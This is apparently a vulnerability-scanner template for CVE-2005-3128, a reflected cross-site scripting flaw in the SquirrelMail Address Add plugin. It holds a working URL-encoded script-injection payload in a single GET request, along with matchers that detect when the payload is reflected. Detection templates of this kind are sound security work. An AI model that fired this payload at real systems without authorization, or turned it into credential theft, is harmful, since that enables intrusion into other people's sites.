id: CVE-2005-3128

info:
  name: SquirrelMail Address Add 1.4.2 - Cross-Site Scripting
  author: dhiyaneshDk
  severity: medium
  description: SquirrelMail Address Add 1.4.2 plugin contains a cross-site scripting vulnerability. It fails to properly sanitize user-supplied input, thus allowing an attacker to execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
  reference:
    - https://www.exploit-db.com/exploits/26305
    - https://nvd.nist.gov/vuln/detail/CVE-2005-3128
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2005-3128
    epss-score: 0.01777
    epss-percentile: 0.82007
    cwe-id: CWE-80
  metadata:
    max-request: 1
    verified: true
  tags: cve,cve2005,xss,squirrelmail,plugin,edb

http:
  - method: GET
    path:
      - '{{BaseURL}}/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "</script><script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - "text/html"
# digest: 4a0a00473045022100ea6cd8e202dc88083664e747e04ab84f11fe2e683a82c5712ad566de40842f8602202abf2a9ca05867e8c371ec8554da82d32ac46bb1fb6c03fbd5324fff0335e4f9:922c64590222798bb761d5b6d8e72950